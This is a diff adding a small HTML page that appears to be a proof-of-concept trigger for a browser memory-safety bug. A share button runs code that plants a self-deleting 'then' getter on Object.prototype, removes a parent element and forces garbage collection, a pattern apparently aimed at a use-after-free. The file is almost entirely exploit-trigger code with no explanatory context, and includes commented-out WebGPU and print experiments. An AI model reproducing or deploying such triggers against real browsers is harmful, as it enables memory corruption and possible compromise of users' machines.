@@ -1,0 +1,31 @@
+
+<html>
+  <p><button onclick="trigger()">Share MDN!</button></p>
+  <!-- <button onclick="print()">123132</button>> -->
+  <script type="module" src="test.js"></script>
+  <script>
+    function gc() {
+      for (let i = 0; i < 0x20; i++) {
+        try {
+          new ArrayBuffer(0x1000000);
+        } catch (e) {}
+      }
+    }
+    async function trigger() {
+      // print()
+      
+      //   const adapter = await navigator.gpu.requestAdapter();
+      // const device = await adapter.requestDevice();
+      Object.prototype.__defineGetter__("then", async function () {
+        delete Object.prototype.then;
+        parent.remove();
+        gc();
+      });
+      // print();
+ 
+      
+    }
+  </script>
+  <!-- </head> -->
+  <!-- <body onload="trigger()"></body> -->
+</html>
